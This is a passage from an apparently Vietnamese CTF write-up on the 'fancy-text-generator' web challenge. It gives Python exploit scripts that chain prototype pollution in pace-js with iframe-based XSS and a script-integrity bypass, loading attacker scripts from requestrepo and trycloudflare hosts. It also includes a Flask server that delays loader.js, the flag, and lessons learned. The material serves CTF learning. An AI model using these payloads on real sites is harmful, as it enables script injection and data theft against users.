htmls = f'&lt;img id=&quot;data-pace-options&quot; data-pace-options=\'{{&quot;startOnPageLoad&quot;:true,&quot;__proto__&quot;:{{&quot;polluted&quot;:&quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}},&quot;className&quot;: &quot;{payload}&quot;}}\'&gt;'
text =  htmls + '&lt;a id =&quot;contentBox&quot;&gt;'
res = requests.get(url,params={&quot;text&quot;:text})
print(res.text)
print(payload)
print(url + &quot;?text=&quot; + urllib.parse.quote(text))

</code></pre>
<p>ƒê·∫øn ƒë√¢y th√¨ script c·ªßa m√¨nh ƒë∆∞·ª£c load r·ªìi nh∆∞ng m√† n√≥ kh√¥ng g·ªçi b·∫•t k√¨ request n√†o c·∫£ ?
<img alt="image" src="https://hackmd.io/_uploads/B1yNWjrVlg.png">
<img alt="image" src="https://hackmd.io/_uploads/BkKVbsSNlg.png">
V√¨ sao ????
ƒê·∫øn ƒë√¢y th√¨ m√¨nh m·ªõi nh·ªõ l√† innerHTML kh√¥ng cho ph√©p script ch·∫°y :vv . Bypass b·∫±ng iframe l√† xong</p>
<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
import urllib.parse
import html



url =&quot;http://localhost:1338&quot;
url =&quot;https://fancy-text-generator-web.shared.challs.mt&quot;

options = &quot;&quot;

#htmls = '''&lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;&quot;}}'&gt;&lt;script&gt;alert()&lt;/img&gt;'''

def html_encode(s):
    return s.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;).replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;).replace('&quot;', &quot;&amp;quot;&quot;).replace(&quot;'&quot;, &quot;&amp;#39;&quot;)

payload ='''aaaa\\&quot;&gt;&lt;iframe srcdoc =\\&quot;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;img id=&amp;amp;quot;data-pace-options&amp;amp;quot; data-pace-options=&amp;amp;#39;{&amp;amp;quot;__proto__&amp;amp;quot;: {&amp;amp;quot;polluted&amp;amp;quot;: &amp;amp;quot;https://nj2n2pew.requestrepo.com/ex.js&amp;amp;quot;}}&amp;amp;#39;&gt;\\&quot;&gt;'''
htmls = f'&lt;img id=&quot;data-pace-options&quot; data-pace-options=\'{{&quot;startOnPageLoad&quot;:true,&quot;__proto__&quot;:{{&quot;polluted&quot;:&quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}},&quot;className&quot;: &quot;{payload}&quot;}}\'&gt;'
text =  htmls + '&lt;a id =&quot;contentBox&quot;&gt;'
res = requests.get(url,params={&quot;text&quot;:text})
print(res.text)
print(payload)
print(url + &quot;?text=&quot; + urllib.parse.quote(text))

</code></pre>
<p>ƒê·∫øn ƒëo·∫°n n√†y th√¨ c√≤n m·ªôt v·∫•n ƒë·ªÅ l√† loader.js c·ªßa m√¨nh s·∫Ω lu√¥n ƒë∆∞·ª£c load tr∆∞·ªõc khi pace-js ƒë∆∞·ª£c load . M√¨nh c√≥ th·ªÉ t·∫°o m·ªôt hanging server v√† g·ª≠i loader.js ƒë√∫ng v·ªõi file ban ƒë·∫ßu ƒë·ªÉ kh√¥ng b·ªã l·ªói intergriti</p>
<pre  class="mc-prism hide language-text" ><code class="language-python">from flask import Flask, send_file
from flask_cors import CORS

import time 

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

@app.route('/loader.js')
def serve_js():
    time.sleep(3)
    return send_file('src/static/loader.js', mimetype='application/javascript')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)

</code></pre>
<p>Full script :</p>
<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
import urllib.parse
import html



url =&quot;http://localhost:1338&quot;
url =&quot;https://fancy-text-generator-web.shared.challs.mt&quot;

options = &quot;&quot;

#htmls = '''&lt;img id=&quot;data-pace-options&quot; data-pace-options='{&quot;__proto__&quot;: {&quot;polluted&quot;: &quot;&quot;}}'&gt;&lt;script&gt;alert()&lt;/img&gt;'''

def html_encode(s):
    return s.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;).replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;).replace('&quot;', &quot;&amp;quot;&quot;).replace(&quot;'&quot;, &quot;&amp;#39;&quot;)

payload ='''aaaa\\&quot;&gt;&lt;iframe srcdoc =\\&quot;&lt;img id=&amp;amp;quot;data-pace-options&amp;amp;quot; data-pace-options=&amp;amp;#39;{&amp;amp;quot;__proto__&amp;amp;quot;: {&amp;amp;quot;polluted&amp;amp;quot;: &amp;amp;quot;https://nj2n2pew.requestrepo.com/ex.js&amp;amp;quot;}}&amp;amp;#39;&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;/loader.js&amp;amp;quot;&gt;&lt;/script&gt;&lt;script crossorigin=&amp;amp;quot;anonymous&amp;amp;quot;integrity=&amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;amp;quot; src=&amp;amp;quot;https://commissioners-mozilla-messenger-compressed.trycloudflare.com/loader.js&amp;amp;quot;&gt;&lt;/script&gt;\\&quot;&gt;'''
htmls = f'&lt;img id=&quot;data-pace-options&quot; data-pace-options=\'{{&quot;startOnPageLoad&quot;:true,&quot;__proto__&quot;:{{&quot;polluted&quot;:&quot;https://nj2n2pew.requestrepo.com/ex.js&quot;}},&quot;className&quot;: &quot;{payload}&quot;}}\'&gt;'
text =  htmls + '&lt;a id =&quot;contentBox&quot;&gt;'
res = requests.get(url,params={&quot;text&quot;:text})
print(res.text)
print(payload)
print(url + &quot;?text=&quot; + urllib.parse.quote(text))

</code></pre>
<p>D√πng script v·ªõi cross-origin = anonymous ƒë·ªÉ request cors enabled.
ƒê·∫øn ƒë√¢y l√† xong b√†i r√πi &hellip;</p>
<p>flag :
<strong>maltactf{oops_my_dependency_is_buggy_05b19465ce19db4e28ddb00bb19f101e}</strong></p>

<h1 id="c·∫£m-nh·∫≠n-" class="header-anchor-wrapper">C·∫£m nh·∫≠n :
  <a href="#c%e1%ba%a3m-nh%e1%ba%adn-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
<li>Gi·∫£i n√†y kh√° l√† khoai :vv m·ªõi c√¢u 2 thui m√† m√¨nh ƒë√£ qu√° ngu r√≤i. Thi xong s·∫Ω quay l·∫°i l√†m m·∫•y c√¢u c√≤n l·∫°i bruhh.</li>
</ul>

<h1 id="sai-l·∫ßm-" class="header-anchor-wrapper">Sai l·∫ßm :
  <a href="#sai-l%e1%ba%a7m-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ol>
<li>Kh√¥ng ki·ªÉm tra h·∫øt input v√†o m·ªôt app</li>
<li>Qu√° tin t∆∞·ªüng v√†o package latest :(</li>
<li>Skill issue khi l√†m vi·ªác v·ªõi html entity encode</li>
</ol>

<h1 id="new-knowledge-" class="header-anchor-wrapper">New knowledge :
  <a href="#new-knowledge-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
<li>Object prototype in latest pace-js</li>
<li>Enumerable inherit trong for in v√† v√¢ng v√¢ng</li>
<li>Script intergrity check</li>
</ul>

<h1 id="audit-sau-gi·∫£i" class="header-anchor-wrapper">Audit sau gi·∫£i
  <a href="#audit-sau-gi%e1%ba%a3i" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
<li>Dompurify id &ldquo;script&rdquo; and &ldquo;scripts&rdquo;</li>
<li>Style with background can make xs leak with no csp ? &ndash;</li>
</ul>

</article>
</div>
   
      </div>
    </main>
<footer>
    <article>Copyright ¬© 2025 by 3HLD Team | v1.0</article>
</footer>

</body>
</html>
